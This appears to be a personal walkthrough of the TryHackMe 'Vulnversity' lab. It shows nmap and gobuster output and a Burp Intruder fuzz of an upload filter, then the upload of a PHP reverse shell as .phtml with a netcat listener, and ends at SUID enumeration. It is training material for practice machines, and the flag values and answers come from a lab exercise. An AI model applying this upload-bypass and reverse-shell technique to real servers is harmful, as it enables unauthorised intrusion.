### Vulnversity

`export IP: 10.10.189.12`

#### Deploy the Machine

Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.


Deploy the machine
Ans. No answer needed


#### Reconaissance

Scan this box: `nmap -sV <machines ip>`


nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below is a table summarising some of the functionality it provides.

There are many nmap "cheatsheets" online that you can use too.


Scan the box, how many ports are open?
Ans. 6

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Vulnversity]
└─$ cat nmap_results.txt   
# Nmap 7.92 scan initiated Sun Aug 14 05:05:57 2022 as: nmap -sC -sV -oN nmap_results.txt 10.10.189.12
Nmap scan report for 10.10.189.12
Host is up (0.33s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-08-14T05:06:34-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-time: 
|   date: 2022-08-14T09:06:36
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 14 05:06:45 2022 -- 1 IP address (1 host up) scanned in 48.02 seconds
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Vulnversity]


```



What version of the squid proxy is running on the machine?
Ans. 

```
3128/tcp open  http-proxy  Squid http proxy 3.5.12

```

How many ports will nmap scan if the flag -p-400 was used?
Ans. 400

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Vulnversity]
└─$ nmap -sC -sV -p-400 -oN nmap_results2.txt 10.10.189.12
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 05:10 EDT
Nmap scan report for 10.10.189.12
Host is up (0.33s latency).
Not shown: 397 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-14T09:11:10
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-08-14T05:11:10-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.61 seconds
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Vulnversity]
└─$ 


```

Using the nmap flag -n what will it not resolve?
Ans. dns

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Vulnversity]
└─$ nmap -sC -sV -p- -n 10.10.189.12 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 05:12 EDT

```

What is the most likely operating system this machine is running?
Ans. Ubuntu

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: **Apache/2.4.18 (Ubuntu)**
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



```

What port is the web server running on?
Ans. 3333

```
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```


Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)


#### Locating directories using GoBuster

new IP: 10.10.125.143


Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using Kali Linux you can find many wordlists under /usr/share/wordlists.

What is the directory that has an upload form page?
Ans. /internal/

```
┌──(kali㉿kali)-[~]
└─$ sudo gobuster dir -u "http://10.10.125.143:3333" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.143:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/14 07:03:27 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.125.143:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.125.143:3333/css/]   
/js                   (Status: 301) [Size: 318] [--> http://10.10.125.143:3333/js/]    
/fonts                (Status: 301) [Size: 321] [--> http://10.10.125.143:3333/fonts/] 
/internal             (Status: 301) [Size: 324] [--> http://10.10.125.143:3333/internal/]
Progress: 5564 / 220561 (2.52%)                                                         ^C
[!] Keyboard interrupt detected, terminating.
                                                                                         
===============================================================
2022/08/14 07:07:17 Finished
===============================================================
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 


```

#### Compromise the webserver

Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

Try upload a few file types to the server, what common extension seems to be blocked?
Ans. .php

![[Pasted image 20220814073059.png]]

To identify which extensions are not blocked, we're going to fuzz the upload form.

We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions in:

![[Pasted image 20220814073517.png]]

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:


![[Pasted image 20220814073459.png]]

![[Pasted image 20220814073720.png]]


Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell here.

To gain remote access to this machine, follow these steps:

Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).

Rename this file to php-reverse-shell.phtml

We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

![[Pasted image 20220814074442.png]]

![[Pasted image 20220814074625.png]]


Upload your shell and navigate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml `- This will execute your payload


![[Pasted image 20220814074806.png]]

You should see a connection on your netcat session

![[Pasted image 20220814075539.png]]

![[Pasted image 20220814075617.png]]

What is the name of the user who manages the webserver?
Ans. bill

```
$ cd home
ls$ 
bill
$ file bill
bill: directory
$ cd bill
$ ls
user.txt
$ 

```

What is the name of the user who manages the webserver?

Flag: 8bd7992fbe8a6ad22a63361004cfcedb

```
$ cat user.txt
2fbe8a6ad22a63361004cfcedb
$ 


```

###  Privilege Escalation

Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).


In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![[Pasted image 20220814090417.png]]

On the system, search for all SUID files. What file stands out?
Ans. /bin/systemctl

![[Pasted image 20220814090500.png]]

